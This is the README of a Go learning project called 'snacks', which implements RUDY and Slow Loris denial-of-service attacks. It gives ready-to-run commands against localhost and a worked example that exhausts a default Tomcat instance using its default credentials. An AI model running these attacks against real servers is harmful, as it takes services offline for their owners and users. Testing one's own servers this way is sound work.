# snacks

A small collection of tools for limited testing of common HTTP vulnerabilities.

Goals:
- Learn Go
- Learn about common HTTP attack vectors

### Clone
```bash
go get github.com/andrewflbarnes/snacks
# or
git clone git@github.com:andrewflbarnes/snacks
```

### Build
```bash
# local build
make
# local install
make install
```

### Run

##### Judy

Judy launches a RUDY (r-u-dead-yet) attack using JSON as the content-type over more typical
MIME types found in other implementations.

For a full list of options, defaults and what they do
```bash
snacks judy -h
```

Example:
```bash
snacks judy -size 1000000 -sd 10ms -sb 7 -vv localhost:8888/boom
```
The above command will
- send 1000000 arbitrary bytes to hold the connection open (not including HTTP POST headers)
- wait 10ms between sending each segment of bytes
- send 7 bytes in every segment (excluding the initial HTTP POST headers)
- set the path to `/boom` in the HTTP POST request and send to `localhost:8888`
- enable trace logging


##### Loris

Loris launches a Slow Loris attack by repeatedly sending a duplicate HTTP header every fixed time period.
At the moment this will always send the whole header, a `-sb`/SendBytes option is not currently available.

For a full list of options, defaults and what they do
```bash
snacks loris -h
```

Example:
```bash
snacks loris -size 1000000 -sd 1s -header "x-slow: loris" -vv localhost:8888/boom
```
The above command will
- send 1000000 repeat instances of the header (not most application servers limit the max. number of HTTP headers)
- wait 1s between sending each header
- set the header to be set to `x-slow: loris`
- set the path to `/boom` in the HTTP POST request and send to `localhost:8888`
- enable trace logging

### Useful judy options

##### Content type

If a specific content-type header is required use the `-type` flag. e.g.
```bash
snacks judy -type application/x-www-form-urlencoded ...
```

For supported content types this will set a default payload prefix which may be overridden with `-prefix`

To override a payload prefix use the `-prefix` flag. e.g. for a default JSON content-type (which would otherwise
default to using `{"a":"` as the payload prefix)
```bash
snacks judy -prefix '{"payload":"' ...
```

For custom content-types and prefix apyloads specify both `-type` and `-prefix` e.g.
```bash
snacks judy -type application/xml -prefix '<payload>' ...
snacks judy -type application/vnd.my.custom.type -prefix '1|string|payload|' ...
```

### Useful general options

##### Authorization

If authorization is required use either `-basic` or `-bearer` flags e.g.
```bash
snacks loris -basic tomcat:tomcat ...
snacks judy -bearer 0123456789ABCDEF ...
```

##### Arbitrary Headers

To arbitrarily set headers (inlcuding those which have specific options e.g. `-basic` and `-bearer` for `Authorization`)
use the `-headers` option. This takes a list of HTTP headers concatenated with double pipes `||`. e.g.
```bash
snacks judy -headers "Authorization: custom 0123456789||Connection: keep-alive" ...
```

Note: this option is not necessarily useful for slow loris attacks which don't typically allow for headers to be parsed
and validated.

### Examples

Tomcat 8 seems to be particularly susceptible to RUDY attacks in it's default configuration even using
the Http11NioProtocol. For example you can hit a management endpoint or an arbitrary path on a
springboot webapp:
```bash
# first terminal
snacks judy \
  -type application/x-www-form-urlencoded \
  -basic tomcat:tomcat \
  localhost:8888/manager/html/expire
#or
snacks judy \
  localhost:8888/mywebapp
  
# second terminal
while clear; do date; curl localhost:8888 -v; date; sleep 1; done
```

Loss of service occurs around 200 connections in. Perhaps unsuprisingly this matches with the max number
of threads Tomcat is configured to use by default.